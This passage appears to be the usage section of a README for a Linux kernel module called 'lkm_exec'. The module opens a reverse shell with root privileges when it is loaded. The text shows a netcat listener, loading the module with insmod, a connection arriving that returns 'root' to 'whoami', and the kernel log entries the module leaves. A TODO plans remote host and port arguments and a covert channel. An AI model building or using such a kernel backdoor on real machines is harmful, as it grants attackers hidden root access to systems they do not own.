## TODO:
- [ ] Update this to a more recent version. we can include app parameter now. As seen in the POCS Folder.



## Usage

In a terminal (denoted T1):

| T1 |
|---|
```
nc -nvklp 1234
      Listening on 0.0.0.0 1234
```

and in another terminal (this time denoted T2):
| T2 |
|---|

`sudo insmod lkm_exec.ko` - *this will later change into arguments you actually can pass to it; like RH and RP. As well as a (covert) channel of choice*


(and go back to **`T1`**)
| T1 |
|---|

```
nc -nvklp 1234
    Listening on 0.0.0.0 1234
    Connection received on 127.0.0.1 47600

whoami
    root

exit
```

**How does the kern.log file look now?**
```
user@nvidia_VFIO_ws:/lkm3$ cat /var/log/kern.log 
  lkm_exec          [on]   <-- module is loaded by `sudo insmod`
  lkm_exec START P1 [*]    <-- module's start function 'START' is called
  lkm_exec START P2 [*]    <-- START completed. Output redirected. Cleaning up.
  lkm_exec          [off]  <-- exit, unloading module.
```
